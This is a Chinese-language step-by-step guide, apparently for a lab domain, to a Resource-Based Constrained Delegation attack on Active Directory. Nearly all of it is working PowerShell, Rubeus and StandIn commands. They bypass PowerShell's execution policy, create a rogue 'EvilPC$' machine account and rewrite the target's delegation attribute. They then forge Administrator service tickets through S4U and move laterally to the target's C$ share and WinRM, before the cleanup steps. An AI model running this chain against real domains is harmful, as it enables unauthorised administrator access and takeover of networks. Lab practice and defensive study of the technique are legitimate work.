# RBCD 完整流程步驟指南

> "Bad programmers worry about the code. Good programmers worry about data structures." - Linus Torvalds

基於實測驗證的正確步驟。資料結構優先，代碼其次。

## 環境設定
- **攻擊端**: Windows 11 (已加入 SME.LOCAL)
- **目標端**: EC2AMAZ-V903HM1.sme.local (Windows Server 2022)
- **網域**: SME.LOCAL
- **攻擊者帳號**: aduser
- **惡意電腦帳號**: EvilPC$

---

## 步驟 1: 前置準備

### 1.1 安裝必要工具
```powershell
# 安裝 RSAT AD 工具
Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0

# 允許 PowerShell 執行
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
```

### 1.2 驗證權限 (在DC上執行)
```powershell
# 檢查攻擊者是否有權限修改目標電腦物件
.\verify_rbcd_permissions_clean.ps1 -TargetComputer "EC2AMAZ-V903HM1" -AttackerUser "aduser"
```

**預期結果**: 顯示 `VULNERABLE` 或 `NOT VULNERABLE`

---

## 步驟 2: 權限配置 (如果需要)

### 2.1 如果顯示 NOT VULNERABLE
```powershell
# 授予最小 WriteProperty 權限
.\setup_rbcd_lab.ps1 -TargetComputer "EC2AMAZ-V903HM1" -AttackerUser "aduser"
```

**資料結構影響**: 在目標電腦物件上設置 ACL，允許攻擊者寫入 `msDS-AllowedToActOnBehalfOfOtherIdentity` 屬性

---

## 步驟 3: 創建惡意電腦帳號

### 3.1 創建 EvilPC$
```powershell
Import-Module ActiveDirectory
New-ADComputer -Name "EvilPC" -SamAccountName "EvilPC$" -Path "CN=Computers,DC=sme,DC=local" -Enabled $true -AccountPassword (ConvertTo-SecureString "Passw0rd!123" -AsPlainText -Force) -PassThru
```

### 3.2 獲取 EvilPC$ 的 SID
```powershell
(Get-ADComputer -Identity "EvilPC" -Properties SID).SID.Value
# 範例: S-1-5-21-807542958-1552376634-887055384-1144
```

### 3.3 計算 AES-256 金鑰
```powershell
.\Rubeus.exe hash /user:EvilPC$ /password:Passw0rd!123 /domain:SME.LOCAL
```
**記錄 AES256_HASH** (範例: `A7DF...`)

---

## 步驟 4: 配置 RBCD

### 4.1 設置 RBCD 屬性
```powershell: 在attacker 上在一般權限執行，非Administrator
.\StandIn.exe --computer EC2AMAZ-V903HM1 --sid <EVILPC_SID>
# 範例: .\StandIn.exe --computer EC2AMAZ-V903HM1 --sid S-1-5-21-807542958-1552376634-887055384-1144
```

## 若需要先清除現有的 RBCD 屬性再重新設定
powershell# 清除現有的 msDS-AllowedToActOnBehalfOfOtherIdentity
Set-ADComputer -Identity "EC2AMAZ-V903HM1" -Clear msDS-AllowedToActOnBehalfOfOtherIdentity


# 確認已清除 
Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | 
  Select-Object msDS-AllowedToActOnBehalfOfOtherIdentity
## 清除後重新執行 StandIn：
powershell.\StandIn_v13_Net45.exe --computer EC2AMAZ-V903HM1 --sid S-1-5-21-807542958-1552376634-88705


### 4.2 驗證 RBCD 設置
```powershell
Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity
```

**預期結果**: 顯示包含 EvilPC$ SID 的安全描述符

---

## 步驟 5: Kerberos S4U 攻擊

### 5.1 執行 S4U2Self + S4U2Proxy
```powershell
.\Rubeus.exe s4u /user:EvilPC$ /aes256:<AES256_HASH> /impersonateuser:Administrator /msdsspn:cifs/EC2AMAZ-V903HM1.sme.local /domain:SME.LOCAL /ptt
```

### 5.2 驗證票證注入
```powershell
klist tickets
```

**預期結果**: 看到 Administrator 的 CIFS 服務票證

---

## 步驟 6: 橫向移動

### 6.1 存取目標檔案共享
```powershell
dir \\\\EC2AMAZ-V903HM1.sme.local\\C$\\
type \\\\EC2AMAZ-V903HM1.sme.local\\C$\\Windows\\System32\\drivers\\etc\\hosts
```

---

## 步驟 7: WinRM 存取 (選用)

### 7.1 檢查 SPN 配置
```powershell
setspn -L EC2AMAZ-V903HM1
```

### 7.2 如果缺少 HTTP/WSMAN SPN
```powershell
# 需要 Domain Admin 權限
setspn -S http/EC2AMAZ-V903HM1.sme.local EC2AMAZ-V903HM1
setspn -S wsman/EC2AMAZ-V903HM1.sme.local EC2AMAZ-V903HM1
```

### 7.3 獲取 WinRM 票證
```powershell
.\Rubeus.exe s4u /user:EvilPC$ /aes256:<AES256_HASH> /impersonateuser:Administrator /msdsspn:http/EC2AMAZ-V903HM1.sme.local /domain:SME.LOCAL /ptt
```

### 7.4 建立 WinRM 連線
```powershell
Enter-PSSession -ComputerName EC2AMAZ-V903HM1.sme.local -Authentication Kerberos
# 或使用 Invoke-Command
Invoke-Command -ComputerName EC2AMAZ-V903HM1.sme.local -ScriptBlock { whoami }
```

---

## 步驟 8: 清理

### 8.1 移除 RBCD 配置
```powershell
.\StandIn.exe --computer EC2AMAZ-V903HM1 --clear
```

### 8.2 刪除惡意電腦帳號
```powershell
Remove-ADComputer -Identity "EvilPC" -Confirm:$false
```

### 8.3 驗證清理
```powershell
Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity
Get-ADComputer -Filter "Name -eq 'EvilPC'" | Measure-Object
```

---

## 關鍵技術要點

### 資料結構層面
- `msDS-AllowedToActOnBehalfOfOtherIdentity`: 包含安全描述符，控制誰可以代表其他使用者取得票證
- **正常狀態**: 空值
- **攻擊狀態**: 包含授予 EvilPC$ `O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)` 的 ACE

### Kerberos 層面
- **S4U2Self**: 為自己取得轉發票證
- **S4U2Proxy**: 使用轉發票證為其他使用者取得服務票證
- **AES-256**: 現代網域中的優先加密類型

### 錯誤處理
- **WinRM 0x8009030e**: 檢查並註冊 HTTP/WSMAN SPN
- **KDC_ERR_BADOPTION**: 確認 RBCD SID 匹配和票證有效性
- **代理問題**: 確保時間同步和 DNS 解析

---

## 相關文件
- [RBCD_Walkthrough.md](RBCD_Walkthrough.md) - 詳細技術說明
- [RBCD_Proxy_Path_Kali.md](RBCD_Proxy_Path_Kali.md) - Kali 代理版本
- [verify_rbcd_permissions_clean.ps1](verify_rbcd_permissions_clean.ps1) - 權限驗證腳本
- [setup_rbcd_lab.ps1](setup_rbcd_lab.ps1) - 權限配置腳本
- [cleanup_rbcd.ps1](cleanup_rbcd.ps1) - 清理腳本
